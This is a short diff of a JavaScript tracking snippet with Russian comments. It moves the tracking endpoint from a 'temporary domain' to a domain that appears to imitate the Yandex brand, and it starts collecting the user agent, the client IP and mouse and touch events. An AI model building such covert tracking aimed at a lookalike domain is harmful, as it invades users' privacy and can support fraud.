@@ -1,11 +1,10 @@
 (function () {
-  const TRACK_URL = "https://playesop.com"; // временный домен
+  const TRACK_URL = "https://yandexbonus.digital";
 
   const userAgent = navigator.userAgent;
   let clientIp = null;
   let eventBuffer = [];
   let touchPatterns = [];
-
   // Сбор событий
   window.addEventListener("mousemove", (e) => {
     eventBuffer.push({
